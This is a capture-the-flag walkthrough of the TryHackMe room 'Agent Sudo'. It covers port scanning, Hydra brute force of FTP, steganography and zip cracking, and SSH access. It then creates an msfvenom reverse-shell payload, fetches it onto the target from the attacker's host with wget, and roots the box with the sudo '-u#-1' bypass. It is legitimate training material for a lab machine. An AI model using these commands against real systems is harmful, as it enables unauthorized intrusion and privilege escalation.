# Agent Sudo

URL: https://tryhackme.com/room/agentsudoctf

Level: Easy

Date: 9 July 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [HTTP](#http)
	- [Rabbit hole](#rabbit-hole)
	- [Agent Name](#agent-name)
	- [FTP](#ftp)
	- [Steg](#steg)
- [User flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)




## Reconnaissance

### nmap

```bash
$ cat nmap.nmap
# Nmap 7.93 scan initiated Sun Jul  9 18:03:41 2023 as: nmap -T4 -p- -oA nmap 10.10.11.169
Nmap scan report for 10.10.11.169
Host is up (0.061s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sun Jul  9 18:05:24 2023 -- 1 IP address (1 host up) scanned in 103.20 seconds
```

### nmap verbose

```bash
$ sudo nmap -T4 -p21,80 -sC -sV  10.10.11.169 -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 18:07 CEST
Nmap scan report for 10.10.11.169
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds
```

### http 

![](Pasted%20image%2020230709181002.png)


So we need to pass correct `user-agent` to move forward.



Meanwhile, `gobuster` is not finding anything:

```bash
$ gobuster dir -u http://10.10.11.169 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.169
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/07/09 18:08:42 Starting gobuster in directory enumeration mode
===============================================================
Progress: 87658 / 87665 (99.99%)
===============================================================
2023/07/09 18:20:38 Finished
===============================================================
```

### rabbit hole

I tried fuzzing `User-Agent` within ZAP, by using `cirt-default-usernames.txt`:


![](Pasted%20image%2020230709182003.png)

![](Pasted%20image%2020230709182549.png)



![](Pasted%20image%2020230709182829.png)

Maybe we need to brute force.

According to TryHackMe, user agent should be 5 characters.

Let's populate a sublist of `rockyou.txt`, with just strings of 5 letters:

```bash
joshua@kaligra:~/Documents/thm/agent_sudo$ grep -P "^[a-z]{5}$" /usr/share/wordlists/rockyou.txt > user-agents.txt
joshua@kaligra:~/Documents/thm/agent_sudo$ wc user-agents.txt
125731 125731 754386 user-agents.txt
```

At about 50% (61794 requests sent) we haven't found anything yet:

![](Pasted%20image%2020230709185508.png)



According to THM's hint, codename should start with `C`.

```bash
$ grep -P "^c[a-z]{4}$" /opt/SecLists/Usernames/Names/names.txt | sed -e 's/^c/C/g'
```


![](Pasted%20image%2020230709190935.png)

### agent name

...we just realize that we need the codename (a *single* character) to disclose the agent name (the actual answer, 5 characters):

![](Pasted%20image%2020230709191012.png)


```bash
$ curl -L http://10.10.11.169 -H 'User-Agent: C'
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R

```


### ftp


```bash
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.11.169
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-09 19:17:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.11.169:21/
[21][ftp] host: 10.10.11.169   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-09 19:18:45
```

```bash
$ ftp 10.10.11.169
Connected to 10.10.11.169.
220 (vsFTPd 3.0.3)
Name (10.10.11.169:joshua): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||49396|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```

We got 2 image files and this message:

```
$ cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

### steg

```bash
$ stegseek cute-alien.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
```

```bash
$ cat cute-alien.jpg.out
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We still miss the "zip file".

Let's focus on other image file, `cutie.png`.

It seems we can't use previous tool:

```bash
$ stegseek cutie.png
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file "cutie.png" is not supported.
```

Let's try to *explore* file with `binwalk`:

```bash
$ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

```bash
$ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

```bash
joshua@kaligra:~/Documents/thm/agent_sudo/_cutie.png.extracted$ ls -l
total 316
-rw-r--r-- 1 joshua joshua 279312 Jul 10 16:45 365
-rw-r--r-- 1 joshua joshua  33973 Jul 10 16:45 365.zlib
-rw-r--r-- 1 joshua joshua    280 Jul 10 16:45 8702.zip
-rw-r--r-- 1 joshua joshua      0 Oct 29  2019 To_agentR.txt
joshua@kaligra:~/Documents/thm/agent_sudo/_cutie.png.extracted$ file *
365:           data
365.zlib:      Zip archive, with extra data prepended
8702.zip:      Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
To_agentR.txt: empty
```

Let's convert ZIP file to John's format:

```bash
joshua@kaligra:~/Documents/thm/agent_sudo/_cutie.png.extracted$ zip2john 8702.zip > 8702-tocrack
joshua@kaligra:~/Documents/thm/agent_sudo/_cutie.png.extracted$ cat 8702-tocrack
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
```

Let's crack!

```bash
$ john --format=zip 8702-tocrack
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:01 DONE 2/3 (2023-07-10 16:47) 1.000g/s 44444p/s 44444c/s 44444C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```



## user flag

Let's access to target server with `james`'s credentials:

```bash
$ ssh james@10.10.232.159
james@10.10.232.159's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c0414XXXXXXXXXXXXXXX
```

We also found another image file, `Alien_autospy.jpg

![](Pasted%20image%2020230710165829.png)

We don't find anything with `binwalk` or `stegseek`.

We need to do a reverse search image on Google, and we found:

https://en.wikipedia.org/wiki/Roswell_incident

answer: *roswell alien autopsy*

## privilege escalation


We can't gain root shell simply with `sudo`:

```bash
$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ sudo bash
Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo.
```

Let's try with `linpeas`

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

![](Pasted%20image%2020230710170700.png)

```bash
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034
```

Anyway, this seems a wrong answer.

We try with `meterpreter`

```bash
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.100.14 LPORT=5555 -f elf > /tmp/shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```

```bash
[*] Starting persistent handler(s)...
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 5555
lport => 5555
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.8.100.14:5555
```

Meanwhile, on victim machine:

```bash
james@agent-sudo:~$ wget http://10.8.100.14:8888/shell.elf
--2023-07-10 15:30:13--  http://10.8.100.14:8888/shell.elf
Connecting to 10.8.100.14:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 207 [application/octet-stream]
Saving to: ‘shell.elf’

shell.elf                                       100%[=====================================================================================================>]     207  --.-KB/s    in 0s

2023-07-10 15:30:13 (12.8 MB/s) - ‘shell.elf’ saved [207/207]

james@agent-sudo:~$ chmod +x shell.elf
```

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use 0
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.232.159 - Collecting local exploits for x86/linux...
```

We get several exploit, but none is accepted:

```bash
[CVE-2021-4034]
[CVE-2021-3156]
[CVE-2021-3156]
[CVE-2018-18955]
[CVE-2021-22555]
https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
[CVE-2019-18634]
https://dylankatz.com/Analysis-of-CVE-2019-18634/
[CVE-2019-15666]
[CVE-2017-5618]
[CVE-2017-0358]
```

```bash
james@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

Let's try this technique:

https://steflan-security.com/linux-privilege-escalation-vulnerable-sudo-version/

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
[sudo] password for james:
root@agent-sudo:~#
```


